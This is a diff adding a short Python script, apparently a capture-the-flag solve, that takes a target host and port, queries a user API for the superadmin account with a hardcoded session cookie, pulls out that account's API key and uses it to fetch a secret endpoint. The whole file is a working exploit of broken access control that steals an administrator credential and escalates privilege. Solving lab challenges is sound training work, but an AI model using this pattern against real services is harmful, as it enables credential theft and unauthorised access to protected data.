@@ -1,0 +1,18 @@
+import requests
+import json
+from sys import argv
+
+url = 'http://{}:{}/api/v1/user?username=superadmin'.format(argv[1], argv[2])
+flag = 'http://{}:{}/api/v1/secret'.format(argv[1], argv[2])
+
+r = requests.get(url, cookies = {'JSESSIONID': 'C3E17EB68B67EF1C194504D4D88B5ADE'})
+#print(r.text)
+api_key = json.loads(r.text)['api_key']
+r.close()
+
+r = requests.get(flag, headers={"api-key": api_key})
+print(r.text)
+r.close()
+
+
+
